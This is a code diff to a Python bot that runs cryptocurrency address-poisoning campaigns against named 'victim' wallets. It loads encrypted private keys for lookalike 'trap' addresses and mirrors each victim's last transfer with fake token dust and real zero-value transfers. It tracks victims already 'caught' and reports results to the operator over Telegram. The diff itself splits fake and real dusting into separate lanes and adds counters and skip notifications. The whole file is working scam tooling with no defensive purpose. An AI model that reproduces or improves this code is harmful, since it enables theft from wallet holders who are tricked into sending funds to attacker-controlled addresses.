@@ -1179,7 +1179,7 @@ def update_trap_zero_dust_count(trap_id):
     - zero_dust_count
     - last_zero_dusted_at
     """
-    if not supabase or not trap_id or not REAL_DUST_UPDATE_ZERO_COUNT:
+    if not supabase or not trap_id:
         return
 
     now_iso = datetime.now(timezone.utc).isoformat()
@@ -1982,7 +1982,7 @@ def get_trap_entries_from_db(campaign_id):
         return entries
     try:
         result = supabase.table("traps")\
-            .select("id, victim_address, trap_private_key_enc, dust_count, counterparty_address")\
+            .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address")\
             .eq("campaign_id", campaign_id)\
             .execute()
         if not result.data:
@@ -1997,10 +1997,11 @@ def get_trap_entries_from_db(campaign_id):
                 w3.eth.account.from_key(private_key)
                 victim = row.get("victim_address", "").lower()
                 dust_count = row.get("dust_count", 0) or 0
+                zero_dust_count = row.get("zero_dust_count", 0) or 0
                 trap_id = row.get("id")
                 counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
                 if victim:
-                    entries.append((trap_id, victim, private_key, dust_count, counterparty))
+                    entries.append((trap_id, victim, private_key, dust_count, counterparty, zero_dust_count))
             except Exception as e:
                 logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
                 continue
@@ -2022,7 +2023,7 @@ def get_trap_entries_by_ids(trap_ids):
         for i in range(0, len(trap_ids), 500):
             chunk = trap_ids[i:i + 500]
             result = supabase.table("traps")\
-                .select("id, victim_address, trap_private_key_enc, dust_count, counterparty_address")\
+                .select("id, victim_address, trap_private_key_enc, dust_count, zero_dust_count, counterparty_address")\
                 .in_("id", chunk)\
                 .execute()
             if not result.data:
@@ -2036,9 +2037,10 @@ def get_trap_entries_by_ids(trap_ids):
                     w3.eth.account.from_key(private_key)
                     victim = row.get("victim_address", "").lower()
                     dust_count = row.get("dust_count", 0) or 0
+                    zero_dust_count = row.get("zero_dust_count", 0) or 0
                     counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
                     if victim:
-                        entries.append((row.get("id"), victim, private_key, dust_count, counterparty))
+                        entries.append((row.get("id"), victim, private_key, dust_count, counterparty, zero_dust_count))
                 except Exception as e:
                     logger.error(f"Failed to decrypt private key for trap {row.get('id')}: {e}")
                     continue
@@ -2385,6 +2387,33 @@ def send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=Fals
         logger.error(f"[Telegram] Failed to send batch notification: {e}")
 
 
+def send_skipped_dusted_notifications(skipped_details, campaign_id):
+    """Tell the user which traps were skipped because they were already dusted."""
+    if not skipped_details:
+        return
+    try:
+        CHUNK_SIZE = 10
+        chunks = [skipped_details[i:i + CHUNK_SIZE] for i in range(0, len(skipped_details), CHUNK_SIZE)]
+        for chunk_idx, chunk in enumerate(chunks):
+            if len(chunks) > 1:
+                header = f"⏭️ *Skipped Already-Dusted Traps* (Part {chunk_idx + 1}/{len(chunks)})\n\n"
+            else:
+                header = "⏭️ *Skipped Already-Dusted Traps*\n\n"
+            header += f"👥 Skipped: {len(skipped_details)}\n"
+            header += "💡 No new dust was sent for these.\n\n"
+            msg = header
+            start_idx = chunk_idx * CHUNK_SIZE + 1
+            for idx, s in enumerate(chunk, start_idx):
+                victim_url = get_explorer_url(s['victim'])
+                msg += f"*{idx}.* {s['reason']}\n"
+                msg += f"👤 [Victim]({victim_url})\n"
+                msg += f"🪞 Fake dust count: `{s['dust_count']}`\n"
+                msg += f"💧 Real zero count: `{s['zero_dust_count']}`\n\n"
+            send_telegram(msg, campaign_id=campaign_id)
+    except Exception as e:
+        logger.error(f"[Telegram] Failed to send skipped notification: {e}")
+
+
 def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     has_trap_ids = trap_ids is not None and len(trap_ids) > 0
     
@@ -2463,6 +2492,9 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     gas_failures = 0
     skipped_dusted = 0
     real_success = 0
+    fake_attempted = 0
+    real_attempted = 0
+    skipped_details = []
     poison_queue = []  # Single unified queue for all assets (multi-token batching)
     real_queue = []    # Separate real zero-value dust queue
     
@@ -2472,23 +2504,45 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         key = entry[2]
         dust_count = entry[3]
         counterparty = entry[4]
-            
+        zero_dust_count = entry[5] if len(entry) > 5 else 0
+
         if victim.lower() in caught:
             logger.info(f"Skipping caught victim {victim}")
             continue
 
-        # 🚀 SKIP ALREADY DUSTED TRAPS
-        if dust_count > 0:
-            logger.info(f"[{i}/{total}] Skipping already dusted victim {victim} (dust_count: {dust_count})")
+        # 🚀 INDEPENDENT LANES: fake gated by dust_count, real gated by zero_dust_count
+        fake_needed = dust_count == 0
+        real_needed = REAL_DUST_ENABLED and zero_dust_count == 0
+
+        if not fake_needed and not real_needed:
+            logger.info(
+                f"[{i}/{total}] Skipping already dusted victim {victim} "
+                f"(fake dust_count: {dust_count}, real zero_dust_count: {zero_dust_count})"
+            )
             skipped_dusted += 1
+            skipped_details.append({
+                'victim': victim,
+                'dust_count': dust_count,
+                'zero_dust_count': zero_dust_count,
+                'reason': 'Fake + real already dusted',
+            })
             continue
 
-        logger.info(f"[{i}/{total}] Processing victim {victim}")
+        logger.info(
+            f"[{i}/{total}] Processing victim {victim} "
+            f"(fake_needed={fake_needed}, real_needed={real_needed})"
+        )
         
         trap_address = w3.eth.account.from_key(key).address.lower()
         
         if not counterparty:
             logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
+            skipped_details.append({
+                'victim': victim,
+                'dust_count': dust_count,
+                'zero_dust_count': zero_dust_count,
+                'reason': 'No counterparty address',
+            })
             continue
         
         # Fetch last transfer from blockchain (with caching)
@@ -2503,7 +2557,7 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         
         logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
         
-        if REAL_DUST_ENABLED:
+        if real_needed:
             real_asset = choose_real_dust_asset(fetched_asset)
             real_queue.append({
                 'victim': victim,
@@ -2512,15 +2566,18 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                 'amount': 0,
                 'trap_id': trap_id,
             })
-        
-                # 🚀 Add to unified multi-token batch queue
-        poison_queue.append({
-            'victim': victim,
-            'trap': trap_address,
-            'amount': fetched_amount,
-            'asset': fetched_asset,
-            'trap_id': trap_id,
-        })
+            real_attempted += 1
+
+        # 🚀 Add to unified multi-token batch queue (only if fake not yet done)
+        if fake_needed:
+            poison_queue.append({
+                'victim': victim,
+                'trap': trap_address,
+                'amount': fetched_amount,
+                'asset': fetched_asset,
+                'trap_id': trap_id,
+            })
+            fake_attempted += 1
         
         # 🚀 Process batch when queue reaches BATCH_SIZE (700)
         if len(poison_queue) >= BATCH_SIZE:
@@ -2606,31 +2663,43 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     if REAL_DUST_ENABLED:
         logger.info(f"[real-zero] Real zero-dust completed for this run: {real_success}")
         
-        # Summary with gas failure information
-    failed = total - success - skipped_dusted
-    logger.info(f"Completed: {success}/{total} successful. Skipped (already dusted): {skipped_dusted}. Failed: {failed} (Gas failures: {gas_failures})")
-    
+       # Summary with gas failure information
+    failed = fake_attempted - success
+    real_failed = real_attempted - real_success if REAL_DUST_ENABLED else 0
+    logger.info(
+        f"Completed: fake {success}/{fake_attempted}, real {real_success}/{real_attempted}. "
+        f"Skipped (already dusted): {skipped_dusted}. Failed: {failed} (Gas failures: {gas_failures})"
+    )
+
+    send_skipped_dusted_notifications(skipped_details, campaign_id)
+
     if gas_failures > 0:
         summary_msg = (
             f"⚠️ Mirror batch incomplete\n"
-            f"✅ Successful: {success}/{total}\n"
+            f"🪞 Fake successful: {success}/{fake_attempted}\n"
+            f"💧 Real zero-dust: {real_success}/{real_attempted}\n"
             f"⏭️ Skipped (already dusted): {skipped_dusted}\n"
             f"❌ Failed: {failed}\n"
             f"⛽ Gas failures: {gas_failures}\n\n"
             f"💡 Your funding wallet needs more ETH to continue."
         )
     else:
-        summary_msg = f"🏁 Mirror batch complete: {success}/{total} successful.\n⏭️ Skipped (already dusted): {skipped_dusted}"
+        summary_msg = (
+            f"🏁 Batch complete\n"
+            f"🪞 Fake: {success}/{fake_attempted} successful\n"
+            f"⏭️ Skipped (already dusted): {skipped_dusted}"
+        )
         if REAL_DUST_ENABLED:
-            summary_msg += f"\n💧 Real zero-dust: {real_success} successful"
-    
+            summary_msg += f"\n💧 Real zero-dust: {real_success}/{real_attempted} successful"
+
     send_telegram(summary_msg, campaign_id=campaign_id)
 
     if job_id:
-        if success == total:
+        all_ok = (success == fake_attempted) and (real_success == real_attempted)
+        if all_ok:
             update_job(job_id, status='completed', progress=total, message='All done')
         else:
-            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded ({gas_failures} gas failures)')
+            update_job(job_id, status='failed', progress=success, message=f'fake {success}/{fake_attempted}, real {real_success}/{real_attempted} ({gas_failures} gas failures)')
 
 if __name__ == "__main__":
     setup_graceful_shutdown()
